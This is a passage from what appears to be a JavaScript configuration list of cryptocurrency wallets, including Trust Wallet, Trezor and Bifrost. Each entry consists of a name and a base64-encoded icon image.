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",
    },
    {
      name: "Trust Wallet",
      icon: "data:image/jpeg;base64,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",
    },
    {
      name: "Trezor",
      icon: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOAAAADgCAMAAAAt85rTAAAAe1BMVEX///8GBwUAAACampm+vr6xsbEmJyXp6ekAAgDExMSLi4ttbW3IyMj39/fx8fHs7OzZ2dkfIB/T09O3t7deX17h4uEXGBY4OThOTk7Ozs7k5OR5enkpKimnp6dAQD+goKAyMjGHh4dZWllKS0qUlJRmZmZ3d3dFRkUPEA8IaORrAAAE5klEQVR4nO2d6VbbMBBGi0LABGc1CVnIwlre/wlrO20OJBp5tFlj+t1/nEbuXGTrk5QE/foFAAAAAAAAAAAAAAAQzGg8n61Ws/l4lLqS4AxXvfvDQp2YPm72s9RFBWM2eDxqXZ04/rzszVPX5s/8+bvaV8p/uOmNU1foxfWOtDs5PqxSV+lMf2G2++f4mKeu1In8iaN3VFxOUldrzfiFq3dU3KQu2JK+jV6teNWpR/HB1q/qxEHqqtmsr6z1asXdMHXlPHL77vtruLhNXTuHwtWvuk07MH/rO+t1w7BQmYegfMPcz68yFP0crt2fv5PhVPJY6u9XGi5TW9A8BPArDd9Se1B4DaBfDYVOvcchbtBa8Ca1ip4Xhl+mOMOszJs0b/A77sNk6nx/RvtaiftuB1PRpdJiU0xGZQQMR7P+hzL3pLpPbXPJtcGv1BmcbaDNNkZFJW+/7YkWVGqraTAcGG5UeV1IP4FKbYi5yXhpMJT2FJIZr9Qd3WpPdqK0gXRE+xknzytyU3jaVuk8tlSdWcOtNiENZa2bXvVlMhY/1MOrntuom8uQqpKxZ90jfjei5mt3RJGs7dwd0VjSynegrVEp1tp1QggWsau2QB9oas9r/a5vLekh1A6FGa8DqS6UtLLXpyB/uqWdp2cqZsl2rPSC19z2b/r2MUu2Q7+SUOx3p4lfkJwVhXYeo/g9MNYLypnLaG8xteNfQC8o5x1DbQyqd/4FtGtfzjSoJfSCFmtWvaBhndUyEGwCgomBYBMQTAwEm4BgYiDYxH8qmGqyPemfUWjfmFCvxfkLKQpi1+niAutWBN/UBbr6ri5fRqJtr7kAexPEC2IrugUgCEEIQhCCEIQgBCEIQQhCEIIQhCAE7QUtNmGc9mhSC6rpTSCm1P+QWDDYx6yJDy8mFwz2+UfqKwoQDAMEvYFgXCDoDQTjAkFvIBgXCHoDwbhA0BsIxgWC3kAwLhD0BoJxgaA3EIwLBL2BYFwg6A0E4wJBbyAYFwh6A8G4QNAbCMYFgt5AMC4Q9AaCcYGgNxCMCwS9gWBcIOgNBONCCi6Yf7S4gRF5jIGA7y4NvA9NWn+I/e7SUXHjdaNOjCcXphesT625dz5VKF82nPkqQLDuxqXTH6+9PjSedSNDsFLcWZeynTYf2yRGsFKc9i0uOezRI4tMwUox46bG6JmlJ0yQnRqmXJAtyEqNyYvFiWniBOvUeDekRv5qdSCcQMGqKvVKpEbBPi1btCCVGpxc6IigJjWGb+yRpROC9XizPw2pY24upBHsO1ZXpkb9TfsqF1wOsy0v0NL5Bexgvqzw49YqF741/gyz3GTBnFppHR3bWU39QrBdhDrTlKP32M7T952icXkTSs9t+RWA/Hd0xYapUHTMWwwh9Py2QAIwv3ccN5o5BUtiXFOjWa/FXDDjnBomvdZzwcz2M6SiUocUuWAmXGokzAUz+S6AYjlwPgg9rr1k5psaWTVdTW1hpEoNl6VCjZRcMOO62Kv0et7v3bSC03K9zAXdkeBS2VoqiswFMzZbZmUuyDmKjw83NUTngpkqNRqG1Gobo52DTuLQkBrdyAUzt3RqdCcXzBCp0bFcMLPPzhXLXJB0mLc/31Ojo7lg5u6UGkq9dDUXzMyqTe2u54KZKjWeu54LZtY/Ww8AAAAAAAAAAAAAgB/AH96PVMcaSXlvAAAAAElFTkSuQmCC",
    },
    {
      name: "Bifrost",
      icon: "data:image/jpeg;base64,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